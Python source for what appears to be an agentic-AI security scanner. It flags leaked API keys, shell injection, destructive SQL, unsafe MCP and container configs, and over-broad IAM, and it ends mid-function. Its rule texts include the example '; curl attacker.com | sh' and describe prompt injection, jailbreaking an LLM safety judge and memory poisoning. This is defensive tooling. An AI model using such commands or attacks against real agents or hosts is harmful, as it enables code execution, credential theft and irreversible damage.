"""AST, MCP, Dockerfile, and Infrastructure-as-Code Architecture Weakness Scanner."""

from __future__ import annotations

import ast
import json
import os
import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import yaml

from aegis.models import (
    NistFunction,
    ResidualRiskItem,
    ScanReport,
    Severity,
    WeaknessFinding,
    utc_now,
)

IGNORED_DIRS: Set[str] = {
    ".git",
    ".venv",
    "venv",
    "node_modules",
    "__pycache__",
    ".pytest_cache",
    "dist",
    "build",
    "aegis_state",
    "aegis_live_playground",
    "vulnerable_enterprise_agent",
}

SECRET_PATTERNS: List[Tuple[str, re.Pattern[str]]] = [
    ("OpenAI API Key", re.compile(r"(?<![A-Za-z0-9_\-])sk-(?:proj-)?[A-Za-z0-9_]{20,}")),
    ("Anthropic API Key", re.compile(r"(?<![A-Za-z0-9_\-])sk-ant-[A-Za-z0-9_\-]{20,}")),
    ("AWS Access Key ID", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("GitHub PAT", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{24,}\b")),
    ("Slack Bot/User Token", re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{16,}\b")),
    ("Stripe Live Secret Key", re.compile(r"\bsk_live_[A-Za-z0-9]{16,}\b")),
]

DESTRUCTIVE_SQL_RE = re.compile(
    r"\b(DELETE\s+FROM|DROP\s+TABLE|TRUNCATE\s+TABLE|UPDATE\s+[a-zA-Z0-9_]+\s+SET)\b",
    re.IGNORECASE,
)

IRREVERSIBLE_CALL_KEYWORDS: Set[str] = {
    "send_wire_transfer",
    "initiate_payout",
    "create_payout",
    "transfer_funds",
    "send_email",
    "sendmail",
    "delete_bucket",
    "terminate_instances",
    "delete_user",
}

VECTOR_WRITE_METHODS: Set[str] = {
    "add_documents",
    "add_texts",
    "upsert",
}

RESIDUAL_RISKS_CATALOG: List[ResidualRiskItem] = [
    ResidualRiskItem(
        threat_vector="Zero-Day Indirect Prompt Injection (Model Layer)",
        enforced_hard_constraint=(
            "Fine-Tuned Adversarial Semantic Classifier (Word + Subword Char N-grams + De-obfuscation) "
            "paired with non-AI deterministic SQL/SSRF/Egress policy gates and surgical rollbacks."
        ),
        cryptographic_guarantee=(
            "Even if an LLM is 100% jailbroken, it cannot forge an offline Ed25519 Owner signature "
            "or unseal AES-256-GCM vault ciphertext."
        ),
    ),
    ResidualRiskItem(
        threat_vector="Authorized Read Exfiltration Within Legitimate Scope",
        enforced_hard_constraint=(
            "Lethal-Trifecta Session Taint State Machine + Per-Session Confidential Read Quotas + "
            "Canary Honeytoken Global Workspace Lockdown."
        ),
        cryptographic_guarantee=(
            "Once a session reads confidential data AND untrusted input, all outbound egress tools "
            "are deterministically locked unless unlocked by an Ed25519 + TOTP OwnerSignatureProof."
        ),
    ),
    ResidualRiskItem(
        threat_vector="Real-Time Deepfake Social Engineering Against Approvers",
        enforced_hard_constraint=(
            "Mandatory Asymmetric Ed25519 Action-Bound Signatures + RFC 6238 6-Digit TOTP + "
            "M-of-N Multi-Owner Quorum + Anti-Replay Nonces."
        ),
        cryptographic_guarantee=(
            "Synthetic voice/video clones cannot produce a valid Ed25519 signature over "
            "`SHA-256(operation || target || canonical_args || nonce || expiry)`."
        ),
    ),
    ResidualRiskItem(
        threat_vector="Compromised Model Weights or Upstream Provider",
        enforced_hard_constraint=(
            "SHA-256 Checkpoint Manifest Verification before loading ML weights + Local TokenBroker "
            "keeping raw secrets and AES-256-GCM vault keys off-model."
        ),
        cryptographic_guarantee=(
            "Tampered `.joblib` weights fail SHA-256 verification prior to deserialization; "
            "upstream LLM providers never receive raw enterprise credentials."
        ),
    ),
]


class ArchitectureScanner:
    """Scans Python code, MCP configs, Dockerfiles, and IaC manifests for agentic security gaps."""

    def scan_path(self, target: str | Path) -> ScanReport:
        root = Path(target).resolve()
        if not root.exists():
            raise FileNotFoundError(f"Scan target does not exist: {root}")

        findings: List[WeaknessFinding] = []
        scanned_files = 0

        files_to_scan: List[Path] = []
        if root.is_file():
            files_to_scan.append(root)
            base_dir = root.parent
        else:
            base_dir = root
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [d for d in dirnames if d not in IGNORED_DIRS]
                for fname in sorted(filenames):
                    files_to_scan.append(Path(dirpath) / fname)

        for fpath in files_to_scan:
            rel_path = str(fpath.relative_to(base_dir)) if fpath != root else fpath.name
            if self._should_skip_file(fpath):
                continue

            scanned_files += 1
            try:
                content = fpath.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue

            lines = content.splitlines()
            name_lower = fpath.name.lower()

            # 1. Scan all text/code files (and .env) for exposed raw secrets
            self._scan_raw_secrets(rel_path, lines, findings)

            # 2. Scan Python files via AST + structural patterns
            if fpath.suffix == ".py":
                self._scan_python_ast(rel_path, content, lines, findings)

            # 3. Scan MCP server JSON configurations
            if fpath.suffix == ".json" and (
                "mcp" in name_lower or "claude_desktop" in name_lower or '"mcpServers"' in content
            ):
                self._scan_mcp_json(rel_path, content, lines, findings)

            # 4. Scan Dockerfiles & docker-compose manifests
            if name_lower == "dockerfile" or name_lower.startswith("dockerfile."):
                self._scan_dockerfile(rel_path, lines, findings)
            elif name_lower in {"docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml"}:
                self._scan_docker_compose(rel_path, content, lines, findings)

            # 5. Scan Terraform / IAM policies
            if fpath.suffix in {".tf", ".json", ".yaml", ".yml"}:
                self._scan_iac_and_iam(rel_path, fpath.suffix, content, lines, findings)

        score, grade = self._compute_score(findings)
        summary_by_sev = {sev.value: 0 for sev in Severity}
        for item in findings:
            summary_by_sev[item.severity.value] += 1

        nist_coverage = self._compute_nist_coverage(findings)

        return ScanReport(
            target_path=str(root),
            scanned_files_count=scanned_files,
            architecture_score=score,
            posture_grade=grade,
            summary_by_severity=summary_by_sev,
            nist_rmf_coverage=nist_coverage,
            findings=findings,
            residual_risks=RESIDUAL_RISKS_CATALOG,
            generated_at=utc_now().isoformat(),
        )

    @staticmethod
    def _should_skip_file(fpath: Path) -> bool:
        binary_exts = {".png", ".jpg", ".jpeg", ".gif", ".pdf", ".whl", ".pyc", ".db", ".sqlite", ".zip"}
        return fpath.suffix.lower() in binary_exts

    @staticmethod
    def _line_snippet(lines: List[str], line_no: int) -> str:
        if 1 <= line_no <= len(lines):
            return lines[line_no - 1].strip()[:200]
        return ""

    @staticmethod
    def _has_ignore_marker(lines: List[str], line_no: int) -> bool:
        if 1 <= line_no <= len(lines):
            return "aegis:ignore" in lines[line_no - 1]
        return False

    def _scan_raw_secrets(
        self, rel_path: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        is_env_file = Path(rel_path).name.startswith(".env")
        for idx, line in enumerate(lines, start=1):
            if self._has_ignore_marker(lines, idx):
                continue
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue

            for label, pattern in SECRET_PATTERNS:
                if pattern.search(line):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-SEC-001",
                            title=f"Exposed Raw Credential ({label}) Accessible to Agent Runtime",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Credential Theft & Non-Human Identity Abuse",
                            file_path=rel_path,
                            line_number=idx,
                            code_snippet=self._redact_line(stripped),
                            why_weak=(
                                "Static long-lived API keys in agent workspaces or .env files can be exfiltrated "
                                "via a single indirect prompt injection or file-read tool call, giving attackers "
                                "permanent off-network access."
                            ),
                            remediation=(
                                "Remove raw keys from agent workspaces. Issue 5-minute scoped session tokens via "
                                "Aegis TokenBroker and route external API calls through a server-side proxy."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )
                    break
            else:
                if is_env_file and re.match(
                    r"^[A-Z0-9_]*(SECRET|PASSWORD|PRIVATE_KEY|ADMIN_TOKEN)[A-Z0-9_]*\s*=\s*['\"]?[^\s'\"]{8,}",
                    stripped,
                ):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-SEC-001",
                            title="Plaintext Secret Variable in .env Exposed to Workspace",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Credential Theft & Non-Human Identity Abuse",
                            file_path=rel_path,
                            line_number=idx,
                            code_snippet=self._redact_line(stripped),
                            why_weak=(
                                "Agents with filesystem or shell tools can read .env files directly, turning any "
                                "prompt injection into full credential compromise."
                            ),
                            remediation=(
                                "Move secrets to a vault/broker outside the agent container and issue ephemeral "
                                "session capability tokens (`TokenBroker.issue_session`)."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

    @staticmethod
    def _redact_line(line: str) -> str:
        if "=" in line:
            key, _, val = line.partition("=")
            cleaned = val.strip().strip("'\"")
            if len(cleaned) > 8:
                return f"{key}={cleaned[:4]}...REDACTED"
        return re.sub(r"(sk-[A-Za-z0-9_\-]{6})[A-Za-z0-9_\-]+", r"\1...REDACTED", line)[:160]

    def _scan_python_ast(
        self, rel_path: str, content: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        try:
            tree = ast.parse(content)
        except SyntaxError:
            return

        uses_undo_db = "UndoableDBEngine" in content or "db_mutation_ledger" in content
        uses_provenance_mem = "ProvenanceMemoryStore" in content or "source_trust" in content
        uses_hitl_gate = (
            "PolicyEngine" in content
            or "require_hitl" in content
            or "ApprovalRequest" in content
            or "AegisProxy" in content
        )
        uses_oob_verification = "oob_challenge" in content or "verify_oob_challenge" in content

        for node in ast.walk(tree):
            line_no = getattr(node, "lineno", 1)
            if self._has_ignore_marker(lines, line_no):
                continue

            # Rule AEGIS-EXEC-004: eval / exec / subprocess(..., shell=True) / os.system
            if isinstance(node, ast.Call):
                func_name = self._call_name(node.func)

                if func_name in {"eval", "exec", "os.system"}:
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-EXEC-004",
                            title=f"Unsandboxed Dynamic Execution (`{func_name}`) in Codebase",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.MANAGE,
                            threat_category="Arbitrary Code Execution & Sandbox Escape",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                f"`{func_name}()` executes arbitrary LLM-generated payloads in the host Python "
                                "process with full access to process memory, network sockets, and credentials."
                            ),
                            remediation=(
                                "Replace dynamic host execution with an isolated microVM/container sandbox "
                                "(network disabled, read-only rootfs, non-root UID) and deterministic command allowlists."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

                if func_name.startswith("subprocess.") and self._has_kwarg_true(node, "shell"):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-EXEC-004",
                            title="Subprocess Invoked with `shell=True` Allowing Command Chaining",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.MANAGE,
                            threat_category="Command Injection & Tool Misuse",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Passing LLM-controlled arguments to `subprocess.*(..., shell=True)` allows "
                                "trivial shell metacharacter injection (`; curl attacker.com | sh`)."
                            ),
                            remediation=(
                                "Use `shell=False` with an explicit argv list validated against an allowlist, "
                                "and execute inside an ephemeral sandbox container."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

                # Wholesale os.environ passed to subprocess or MCP client
                if func_name.startswith("subprocess.") and self._passes_os_environ(node):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-SEC-001",
                            title="Wholesale `os.environ` Passed into Child Tool/Agent Process",
                            severity=Severity.HIGH,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Confused Deputy & Secret Leakage",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Forwarding the full host `os.environ` leaks cloud keys, DB URLs, and internal tokens "
                                "into child tool processes or third-party MCP servers."
                            ),
                            remediation=(
                                "Pass an explicit minimal environment dictionary (`env={'PATH': '/usr/bin'}`) "
                                "and broker external access via short-lived Aegis capability tokens."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

                # Rule AEGIS-DB-003: Direct destructive SQL execution without UndoableDBEngine
                if func_name.endswith((".execute", ".executemany")) and not uses_undo_db:
                    sql_text = self._extract_string_from_args(node)
                    if sql_text and DESTRUCTIVE_SQL_RE.search(sql_text):
                        findings.append(
                            WeaknessFinding(
                                rule_id="AEGIS-DB-003",
                                title="Un-audited Direct SQL Mutation Without `agent_run_id` Rollback Ledger",
                                severity=Severity.HIGH,
                                nist_function=NistFunction.MANAGE,
                                threat_category="Irreversible Data Corruption via Prompt Injection",
                                file_path=rel_path,
                                line_number=line_no,
                                code_snippet=self._line_snippet(lines, line_no),
                                why_weak=(
                                    "Destructive `UPDATE`/`DELETE`/`DROP` queries executed directly overwrite production "
                                    "rows in place without recording `agent_run_id` before/after snapshots—making surgical "
                                    "rollback impossible without wiping concurrent human transactions."
                                ),
                                remediation=(
                                    "Route agent SQL mutations through `UndoableDBEngine.execute_mutation(agent_run_id, ...)` "
                                    "so row-level before/after snapshots are logged for instant surgical rollback."
                                ),
                                is_undoable_once_exploited=True,
                            )
                        )

                # Rule AEGIS-MEM-006: Vector/RAG write without provenance metadata
                short_method = func_name.split(".")[-1]
                if short_method in VECTOR_WRITE_METHODS and not uses_provenance_mem:
                    if not self._has_provenance_kwarg(node):
                        findings.append(
                            WeaknessFinding(
                                rule_id="AEGIS-MEM-006",
                                title=f"Unattributed Agent Memory Write (`{func_name}`) Vulnerable to Memory Poisoning",
                                severity=Severity.HIGH,
                                nist_function=NistFunction.MEASURE,
                                threat_category="RAG / Long-Term Memory Poisoning",
                                file_path=rel_path,
                                line_number=line_no,
                                code_snippet=self._line_snippet(lines, line_no),
                                why_weak=(
                                    "Writing documents/embeddings into long-term agent memory without `source_trust`, "
                                    "`source_doc_id`, and `created_by_run` lineage makes it impossible to quarantine "
                                    "poisoned memories or identify tainted downstream decisions."
                                ),
                                remediation=(
                                    "Ingest agent memories via `ProvenanceMemoryStore.write_memory(...)` to enforce "
                                    "trust levels and track decision read-lineage for 1-click quarantine."
                                ),
                                is_undoable_once_exploited=True,
                            )
                        )

                # Rule AEGIS-HITL-005: Irreversible external side-effects without HITL gate
                if (
                    short_method in IRREVERSIBLE_CALL_KEYWORDS
                    or func_name in {"smtplib.SMTP", "stripe.Transfer.create", "stripe.Payout.create"}
                ) and not uses_hitl_gate:
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-HITL-005",
                            title=f"Irreversible External Action (`{func_name}`) Without Deterministic HITL Gate",
                            severity=Severity.HIGH,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Unauthorized Financial / External Side-Effect",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Financial transfers, external emails, and cloud resource deletions CANNOT be undone "
                                "once executed. Allowing an autonomous tool function to invoke them directly exposes "
                                "the company to catastrophic 1-shot prompt injection loss."
                            ),
                            remediation=(
                                "Classify this tool as `IRREVERSIBLE_CRITICAL` in `PolicyEngine` so invocations pause "
                                "in `ApprovalRequest` queue pending deterministic policy validation and human sign-off."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

            # Rule AEGIS-LOOP-010: Unbounded `while True:` autonomous agent loop
            if isinstance(node, ast.While):
                if isinstance(node.test, ast.Constant) and node.test.value is True:
                    loop_src = ast.get_source_segment(content, node) or ""
                    if "max_steps" not in loop_src and "max_iterations" not in loop_src and "budget" not in loop_src:
                        findings.append(
                            WeaknessFinding(
                                rule_id="AEGIS-LOOP-010",
                                title="Unbounded `while True` Autonomous Loop Without Step/Budget Circuit Breaker",
                                severity=Severity.MEDIUM,
                                nist_function=NistFunction.MEASURE,
                                threat_category="Runaway Autonomous Agent Swarm / Denial of Wallet",
                                file_path=rel_path,
                                line_number=line_no,
                                code_snippet=self._line_snippet(lines, line_no),
                                why_weak=(
                                    "An infinite `while True` tool loop without a hard step ceiling or token circuit "
                                    "breaker allows hijacked or misaligned agents to pivot endlessly at machine speed."
                                ),
                                remediation=(
                                    "Enforce an explicit `max_steps` ceiling and bind every run to an Aegis session "
                                    "token with `max_calls_per_minute` and `total_call_budget` circuit breakers."
                                ),
                                is_undoable_once_exploited=True,
                            )
                        )

            # Rule AEGIS-PROMPT-007: Dynamic f-string inside {"role": "system", "content": f"..."}
            if isinstance(node, ast.Dict):
                role_val = None
                content_node = None
                for k, v in zip(node.keys, node.values):
                    if isinstance(k, ast.Constant) and k.value == "role" and isinstance(v, ast.Constant):
                        role_val = v.value
                    if isinstance(k, ast.Constant) and k.value == "content":
                        content_node = v
                if role_val == "system" and isinstance(content_node, ast.JoinedStr):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-PROMPT-007",
                            title="Dynamic Interpolation into `system` Role Prompt Context",
                            severity=Severity.MEDIUM,
                            nist_function=NistFunction.MAP,
                            threat_category="Direct / Indirect System Prompt Override",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Interpolating dynamic user, email, or web content directly into the `system` message "
                                "elevates untrusted external text to highest instruction privilege."
                            ),
                            remediation=(
                                "Keep `system` instructions static and immutable; pass external documents inside "
                                "delimited untrusted data blocks screened by `PolicyEngine.inspect_input`."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

            # Rule AEGIS-JUDGE-011 & AEGIS-DEEPFAKE-012 on function definitions
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                fn_src = (ast.get_source_segment(content, node) or "").lower()
                if (
                    ("safety_judge" in node.name.lower() or "llm_guard" in node.name.lower())
                    and ("chat.completions" in fn_src or "messages.create" in fn_src)
                    and not uses_hitl_gate
                ):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-JUDGE-011",
                            title=f"Sole Reliance on Probabilistic LLM Judge (`{node.name}`) Without Deterministic Gate",
                            severity=Severity.MEDIUM,
                            nist_function=NistFunction.MEASURE,
                            threat_category="Guardrail Bypass / Dual-Jailbreak",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Using another LLM prompt as the only security gate fails under adversarial suffixes "
                                "that jailbreak both the worker model and the judge model simultaneously."
                            ),
                            remediation=(
                                "Pair semantic checks with deterministic non-AI code policies (schema bounds, SQL AST "
                                "checks, allowlists, and hard HITL locks) in `PolicyEngine`."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

                if (
                    any(k in fn_src for k in ("voice_verified", "video_call_approved", "slack_dm_approved"))
                    and any(k in fn_src for k in ("wire", "payout", "transfer", "grant_admin"))
                    and not uses_oob_verification
                ):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-DEEPFAKE-012",
                            title=f"High-Value Action (`{node.name}`) Trusts Voice/Video/Chat Approval Vulnerable to Deepfakes",
                            severity=Severity.HIGH,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Real-Time Deepfake Executive Impersonation",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "Real-time synthetic voice and video clones trivially spoof executive calls and chat "
                                "messages (e.g., the $25.6M Hong Kong deepfake fraud)."
                            ),
                            remediation=(
                                "Require Ed25519 + TOTP `OwnerSignatureProof` (`OwnerVerificationEngine`) plus "
                                "cryptographic Out-of-Band (OOB) challenge verification before releasing critical actions."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

                if (
                    any(k in fn_src for k in ("approved: bool", "video_call_approved", "is_admin: bool"))
                    and any(k in fn_src for k in ("wire", "payout", "transfer", "decrypt", "vault"))
                    and "OwnerVerificationEngine" not in content
                    and "OwnerSignatureProof" not in content
                    and not uses_hitl_gate
                ):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-OWN-013",
                            title=f"Critical Function (`{node.name}`) Uses Forgable Boolean Flag Instead of Ed25519 Owner Signature",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.GOVERN,
                            threat_category="Missing Cryptographic Owner Verification",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "A jailbroken LLM or hijacked tool caller can trivially pass `approved=True` in JSON "
                                "arguments, bypassing non-cryptographic authorization checks."
                            ),
                            remediation=(
                                "Enforce `OwnerVerificationEngine.verify_owner_proof(...)` requiring an offline "
                                "Ed25519 signature + RFC 6238 TOTP bound to the canonical payload digest."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

    def _scan_mcp_json(
        self, rel_path: str, content: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            return

        servers = data.get("mcpServers", {})
        if not isinstance(servers, dict):
            return

        for server_name, cfg in servers.items():
            if not isinstance(cfg, dict):
                continue
            line_no = self._find_key_line(lines, server_name)
            cmd = str(cfg.get("command", ""))
            args = [str(a) for a in cfg.get("args", [])] if isinstance(cfg.get("args"), list) else []
            url = str(cfg.get("url", ""))

            # Unpinned npx -y package execution (first non-flag arg is the npm package specifier)
            if cmd == "npx" and "-y" in args:
                non_flag_args = [a for a in args if not a.startswith("-")]
                pkg_spec = non_flag_args[0] if non_flag_args else ""
                if pkg_spec and not re.search(r"@[0-9]+\.[0-9]+\.[0-9]+$", pkg_spec):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-MCP-002",
                            title=f"Unpinned Auto-Installed MCP Server (`{server_name}`: `{pkg_spec}`)",
                            severity=Severity.CRITICAL,
                            nist_function=NistFunction.MAP,
                            threat_category="Agentic Supply-Chain & Compromised MCP Hijacking",
                            file_path=rel_path,
                            line_number=line_no,
                            code_snippet=self._line_snippet(lines, line_no),
                            why_weak=(
                                "`npx -y` without an exact pinned version pulls latest mutable npm code at runtime, "
                                "exposing every agent session to supply-chain backdoors and tool-description poisoning."
                            ),
                            remediation=(
                                "Pin exact package versions (`@1.2.3`), vendor audited MCP servers internally, and "
                                "place Aegis MCP Proxy (`POST /v1/proxy/intercept/mcp`) in front of all `tools/call` invokes."
                            ),
                            is_undoable_once_exploited=False,
                        )
                    )

            # Root filesystem `/` or home directory mounted to MCP filesystem server
            if any(a in {"/", "/Users", "/root", "/etc"} for a in args):
                findings.append(
                    WeaknessFinding(
                        rule_id="AEGIS-MCP-002",
                        title=f"Over-Privileged Host Root Path Mounted to MCP Server (`{server_name}`)",
                        severity=Severity.CRITICAL,
                        nist_function=NistFunction.MANAGE,
                        threat_category="Confused Deputy & Host Filesystem Exfiltration",
                        file_path=rel_path,
                        line_number=line_no,
                        code_snippet=self._line_snippet(lines, line_no),
                        why_weak=(
                            "Mounting `/` or `/etc` into an MCP filesystem tool lets any indirect prompt injection "
                            "read SSH keys, cloud credentials, and system files across the host."
                        ),
                        remediation=(
                            "Restrict MCP filesystem mounts to a dedicated isolated workspace subdirectory with "
                            "read-only permissions where possible."
                        ),
                        is_undoable_once_exploited=False,
                    )
                )

            # Unencrypted HTTP remote MCP endpoint
            if url.startswith("http://") and "localhost" not in url and "127.0.0.1" not in url:
                findings.append(
                    WeaknessFinding(
                        rule_id="AEGIS-MCP-002",
                        title=f"Unencrypted Remote HTTP MCP Transport (`{server_name}`)",
                        severity=Severity.HIGH,
                        nist_function=NistFunction.MAP,
                        threat_category="Man-in-the-Middle Tool Poisoning",
                        file_path=rel_path,
                        line_number=line_no,
                        code_snippet=self._line_snippet(lines, line_no),
                        why_weak=(
                            "Connecting to remote MCP servers over plaintext HTTP lets network attackers inject "
                            "malicious tool definitions and intercept tool arguments."
                        ),
                        remediation="Enforce mutually authenticated HTTPS/TLS and verify server identity tokens.",
                        is_undoable_once_exploited=False,
                    )
                )

    def _scan_dockerfile(
        self, rel_path: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        has_non_root_user = False
        from_line = 1
        for idx, line in enumerate(lines, start=1):
            stripped = line.strip()
            if stripped.upper().startswith("FROM "):
                from_line = idx
            if stripped.upper().startswith("USER "):
                user_val = stripped.split(None, 1)[1].strip()
                if user_val not in {"root", "0"}:
                    has_non_root_user = True

        if not has_non_root_user:
            findings.append(
                WeaknessFinding(
                    rule_id="AEGIS-DOCKER-008",
                    title="Agent Container Runs as `root` (Missing Non-Root `USER` Directive)",
                    severity=Severity.HIGH,
                    nist_function=NistFunction.MANAGE,
                    threat_category="Container Sandbox Escape",
                    file_path=rel_path,
                    line_number=from_line,
                    code_snippet=self._line_snippet(lines, from_line),
                    why_weak=(
                        "Running autonomous agent workloads as UID 0 (`root`) drastically lowers the barrier for "
                        "container breakouts and allows tampering with runtime binaries/logs inside the container."
                    ),
                    remediation=(
                        "Add a dedicated unprivileged user (`RUN useradd -m -u 10001 agent && USER 10001`), drop "
                        "Linux capabilities (`cap_drop: [ALL]`), and mount root filesystem read-only."
                    ),
                    is_undoable_once_exploited=False,
                )
            )

    def _scan_docker_compose(
        self, rel_path: str, content: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        try:
            data = yaml.safe_load(content) or {}
        except yaml.YAMLError:
            return
        services = data.get("services", {})
        if not isinstance(services, dict):
            return
        for svc_name, svc in services.items():
            if not isinstance(svc, dict):
                continue
            line_no = self._find_key_line(lines, svc_name)
            if svc.get("privileged") is True or svc.get("network_mode") == "host":
                findings.append(
                    WeaknessFinding(
                        rule_id="AEGIS-DOCKER-008",
                        title=f"Privileged or Host-Network Agent Service (`{svc_name}`) in Compose",
                        severity=Severity.CRITICAL,
                        nist_function=NistFunction.MANAGE,
                        threat_category="Sandbox Escape & Lateral Network Pivot",
                        file_path=rel_path,
                        line_number=line_no,
                        code_snippet=self._line_snippet(lines, line_no),
                        why_weak=(
                            "`privileged: true` or `network_mode: host` removes kernel/network isolation, allowing "
                            "an escaped autonomous agent to pivot directly onto host interfaces and local services."
                        ),
                        remediation="Remove `privileged: true`, isolate on an internal bridge network, and restrict egress.",
                        is_undoable_once_exploited=False,
                    )
                )

    def _scan_iac_and_iam(
        self, rel_path: str, suffix: str, content: str, lines: List[str], findings: List[WeaknessFinding]
    ) -> None:
        if suffix == ".tf":
            for idx, line in enumerate(lines, start=1):
                if "0.0.0.0/0" in line and not self._has_ignore_marker(lines, idx):
                    findings.append(
                        WeaknessFinding(
                            rule_id="AEGIS-IAC-009",
                            title="Unrestricted `0.0.0.0/0` Network Ingress in Terraform Manifest",
                            severity=Severity.HIGH,
                            nist_function=NistFunction.MANAGE,
                            threat_category="Infrastructure Misconfiguration & Exposure",
                            file_path=rel_path,
                            line_number=idx,
                            code_snippet=self._line_snippet(lines, idx),
                            why_weak=(
                                "Exposing `0.0.0.0/0` CIDR blocks in infrastructure managed or reachable by agents "
                                "opens services to automated internet-wide AI vulnerability scanners."
                            ),
                            remediation=(
                                "Restrict CIDR blocks to private VPC subnets and gate all IaC mutations via "
                                "`GitOpsGuard.stage_infra_change(...)`."
                            ),
                            is_undoable_once_exploited=True,
                        )
                    )
            if re.search(r'actions\s*=\s*\[\s*"\*"\s*\]', content) or re.search(
                r'"Action"\s*:\s*"\*"', content
            ):
                line_no = self._find_regex_line(lines, r'"\*"')
                findings.append(
                    WeaknessFinding(
                        rule_id="AEGIS-IAC-009",
                        title="Wildcard IAM `Action: *` Policy Granted in Terraform",
                        severity=Severity.CRITICAL,
                        nist_function=NistFunction.GOVERN,
                        threat_category="Non-Human Identity Privilege Escalation",
                        file_path=rel_path,
                        line_number=line_no,
                        code_snippet=self._line_snippet(lines, line_no),
                        why_weak=(
                            "Granting wildcard IAM actions to an agent workload role allows a hijacked agent "
                            "to create new admin keys, disable CloudTrail logs, or destroy cloud storage."
                        ),
                        remediation="Scope IAM roles to exact resource ARNs and read/reversible actions only.",
                        is_undoable_once_exploited=False,
                    )
                )

    @staticmethod
    def _call_name(func_node: ast.AST) -> str:
        if isinstance(func_node, ast.Name):
            return func_node.id
        if isinstance(func_node, ast.Attribute):
            prefix = ArchitectureScanner._call_name(func_node.value)
            return f"{prefix}.{func_node.attr}" if prefix else func_node.attr
        return ""

    @staticmethod
    def _has_kwarg_true(call: ast.Call, kw_name: str) -> bool:
        for kw in call.keywords:
            if kw.arg == kw_name and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False

    @staticmethod
    def _passes_os_environ(call: ast.Call) -> bool:
        for kw in call.keywords:
            if kw.arg == "env":
                name = ArchitectureScanner._call_name(kw.value)
                if name in {"os.environ", "os.environ.copy"}:
                    return True
        return False

    @staticmethod
    def _has_provenance_kwarg(call: ast.Call) -> bool:
        for kw in call.keywords:
            if kw.arg in {"metadatas", "metadata", "source_trust", "provenance"}:
                src = ast.unparse(kw.value) if hasattr(ast, "unparse") else ""
                if "source_trust" in src or "source_doc_id" in src:
                    return True
        return False

    @staticmethod
    def _extract_string_from_args(call: ast.Call) -> str:
        if not call.args:
            return ""
        first = call.args[0]
        if isinstance(first, ast.Constant) and isinstance(first.value, str):
            return first.value
        if isinstance(first, ast.JoinedStr):
            parts = [
                p.value for p in first.values if isinstance(p, ast.Constant) and isinstance(p.value, str)
            ]
            return " ".join(parts)
        return ""

    @staticmethod
    def _find_key_line(lines: List[str], key: str) -> int:
        for idx, line in enumerate(lines, start=1):
            if key in line:
                return idx
        return 1

    @staticmethod
    def _find_regex_line(lines: List[str], pattern: str) -> int:
        rx = re.compile(pattern)
        for idx, line in enumerate(lines, start=1):
            if rx.search(line):
                return idx
        return 1

    @staticmethod
    def _compute_score(findings: List[WeaknessFinding]) -> Tuple[int, str]:
        weights = {
            Severity.CRITICAL: 20,
            Severity.HIGH: 11,
            Severity.MEDIUM: 6,
            Severity.LOW: 2,
        }
        penalty = sum(weights[f.severity] for f in findings)
        score = max(0, 100 - penalty)
        if score >= 90:
